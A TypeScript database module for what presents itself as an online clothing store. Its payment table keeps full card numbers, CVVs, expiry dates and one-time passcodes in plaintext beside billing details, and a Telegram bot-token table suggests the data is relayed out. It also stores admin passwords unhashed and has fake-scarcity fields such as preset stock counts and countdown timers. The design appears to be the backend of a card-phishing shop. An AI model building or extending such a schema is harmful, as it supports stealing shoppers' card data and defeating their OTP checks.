import Database from 'better-sqlite3';
import { join } from 'path';

export interface PaymentInfo {
    id: number;
    method: string;
    card_number: string;
    expiry: string;
    cvv: string;
    cardholder_name: string;
    otp?: string;
    status: string;
    created_at: string;
    updated_at?: string;
    first_name?: string;
    last_name?: string;
    email?: string;
    phone?: string;
    country?: string;
    street?: string;
    apartment?: string;
    city?: string;
    state?: string;
    postal_code?: string;
}

export interface Product {
    id: number;
    name: string;
    description: string;
    price: number;
    discount: number;
    care_instructions: string;
    images: string;
    stock: number;
    slug: string;
    sizes: string;
    product_type: string;
    variants: string; // JSON string for buy more save more variants
    currency: string; // Currency: USD or EUR
    reviews: string; // JSON string for product reviews
}

// Shipping
// Variants
// Reviews
export interface AdminAccount {
    id: number;
    username: string;
    password: string;
}

export interface TelegramSettings {
    id: number;
    bot_token: string;
    chat_id: string;
}

export interface ProductViews {
    id: number;
    product_id: number;
    viewers_count: number;
    last_updated: string;
}

export interface ProductSales {
    id: number;
    product_id: number;
    stock_left: number;
    sale_end_time: string;
    is_hot: boolean;
    is_urgent: boolean;
}

const dbPath = join(process.cwd(), 'database.sqlite');
const db = new Database(dbPath);

// Enable WAL mode for better concurrency
db.pragma('journal_mode = WAL');
db.pragma('synchronous = NORMAL');
db.pragma('cache_size = 10000');
db.pragma('temp_store = MEMORY');

const schema = `
CREATE TABLE IF NOT EXISTS product (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT DEFAULT '',
    description TEXT DEFAULT '',
    price DECIMAL(10, 2) DEFAULT 0,
    discount INTEGER DEFAULT 0,
    care_instructions TEXT DEFAULT '',
    images TEXT DEFAULT '[]',
    stock INTEGER DEFAULT 0,
    slug TEXT DEFAULT '',
    sizes TEXT DEFAULT '[]',
    product_type TEXT DEFAULT 'clothing',
    variants TEXT DEFAULT '[]',
    currency TEXT DEFAULT 'USD',
    reviews TEXT DEFAULT '[]'
);

CREATE TABLE IF NOT EXISTS admin_account (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
);

CREATE TABLE IF NOT EXISTS payment_info (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    method TEXT NOT NULL,
    card_number TEXT,
    expiry TEXT,
    cvv TEXT,
    cardholder_name TEXT,
    otp TEXT DEFAULT '',
    status TEXT DEFAULT 'pending',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS telegram_settings (
    id INTEGER PRIMARY KEY AUTOINCREMENT CHECK (id = 1),
    bot_token TEXT DEFAULT '',
    chat_id TEXT DEFAULT ''
);

CREATE TABLE IF NOT EXISTS product_views (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    product_id INTEGER DEFAULT 1,
    viewers_count INTEGER DEFAULT 0,
    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
    UNIQUE(product_id)
);

CREATE TABLE IF NOT EXISTS product_sales (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    product_id INTEGER DEFAULT 1,
    stock_left INTEGER DEFAULT 198,
    sale_end_time DATETIME DEFAULT (datetime('now', '+1 day')),
    is_hot BOOLEAN DEFAULT 1,
    is_urgent BOOLEAN DEFAULT 1,
    UNIQUE(product_id)
);


`;

db.exec(schema);

// Migration: Add sizes column if it doesn't exist
try {
    db.exec("ALTER TABLE product ADD COLUMN sizes TEXT DEFAULT '[]'");
} catch (error) {
    // Column already exists, ignore error
}

// Migration: Add product_type column if it doesn't exist
try {
    db.exec("ALTER TABLE product ADD COLUMN product_type TEXT DEFAULT 'clothing'");
} catch (error) {
    // Column already exists, ignore error
}

// Migration: Add variants column if it doesn't exist
try {
    db.exec("ALTER TABLE product ADD COLUMN variants TEXT DEFAULT '[]'");
} catch (error) {
    // Column already exists, ignore error
}

// Migration: Add currency column if it doesn't exist
try {
    db.exec("ALTER TABLE product ADD COLUMN currency TEXT DEFAULT 'USD'");
} catch (error) {
    // Column already exists, ignore error
}

// Migration: Add reviews column if it doesn't exist
try {
    db.exec("ALTER TABLE product ADD COLUMN reviews TEXT DEFAULT '[]'");
} catch (error) {
    // Column already exists, ignore error
}

// Migration: Add updated_at column to payment_info if it doesn't exist
try {
    db.exec('ALTER TABLE payment_info ADD COLUMN updated_at DATETIME DEFAULT CURRENT_TIMESTAMP');
} catch (error) {
    // Column already exists, ignore error
}

// Migration: Add missing columns to payment_info if they don't exist
const columnsToAdd = ['first_name TEXT', 'last_name TEXT', 'email TEXT', 'phone TEXT', 'country TEXT', 'street TEXT', 'apartment TEXT', 'city TEXT', 'state TEXT', 'postal_code TEXT'];

columnsToAdd.forEach((column) => {
    try {
        db.exec(`ALTER TABLE payment_info ADD COLUMN ${column}`);
    } catch (error) {
        // Column already exists, ignore error
    }
});

export default db;
